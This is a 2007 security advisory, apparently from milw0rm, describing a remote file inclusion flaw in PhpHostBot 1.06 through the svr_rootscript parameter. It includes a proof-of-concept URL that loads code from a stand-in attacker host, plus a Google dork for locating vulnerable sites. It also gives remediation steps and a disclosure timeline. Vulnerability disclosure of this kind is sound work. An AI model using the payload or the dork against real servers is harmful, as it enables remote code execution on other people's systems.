@@ -1,0 +1,88 @@
+____________________   ___ ___ ________
+\_   _____/\_   ___ \ /   |   \\_____  \  
+ |    __)_ /    \  \//    ~    \/   |   \ 
+ |        \\     \___\    Y    /    |    \
+/_______  / \______  /\___|_  /\_______  /
+        \/         \/       \/         \/ 
+
+                                        .OR.ID
+ECHO_ADV_83$2007
+
+-----------------------------------------------------------------------------------------
+[ECHO_ADV_83$2007] PhpHostBot <= 1.06 (svr_rootscript) Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------
+
+Author         : M.Hasran Addahroni
+Date           : August, 7 th 2007
+Location       : Australia, Sydney
+Web            : http://advisories.echo.or.id/adv/adv83-K-159-2007.txt
+Critical Lvl   : Dangerous
+Impact	       : System access
+Where	       : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : PhpHostBot  
+version       : <= 1.06
+Vendor        : http://www.idevspot.com/PhpHostBot.php
+Description :
+
+PhpHostBot is a webware PHP application which integrates with the popular Cpanel(WHM) web hosting control panel.
+PhpHostBot supports Paypal subscriptions, free web hosting, Subdomain and Reseller account setup 
+and supports both dedicated server and Reseller web hosting companies
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+Input passed to the "svr_rootscript" parameter in order/login.php is not properly verified before being used to include files. 
+This can be exploited to include arbitrary files from local or external resources.
+Successful exploitation requires that "register_globals" is enabled.
+
+
+Poc/Exploit:
+~~~~~~~~~
+
+http://www.target.com/[PhpHostBot-path]/order/login.php?svr_rootscript=http://attacker.com/evil?
+
+Google Dork:
+~~~~~~~~~~
+         "order?page=plan_show"
+
+Solution:
+~~~~~~
+
+- Edit the source code to ensure that input is properly verified.
+- Turn off register_globals
+- use the latest version 
+
+Timeline:
+~~~~~~~~
+
+- 27 -07 - 2007 bug found
+- 4 - 08 - 2007 vendor contacted
+- 7 - 08 - 2007 advisory released
+---------------------------------------------------------------------------
+
+Shoutz:
+~~~~
+~ ping - my dearest wife, zautha my little son, for all the luv the tears n the breath
+~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)
+~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw
+~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16
+~ newbie_hacker@yahoogroups.com
+~ #aikmel #e-c-h-o @irc.dal.net
+
+---------------------------------------------------------------------------
+Contact:
+~~~~~
+
+     K-159 || echo|staff || eufrato[at]gmail[dot]com
+     Homepage: http://k-159.echo.or.id/
+
+-------------------------------- [ EOF ] ----------------------------------
+
+# milw0rm.com [2007-08-07]
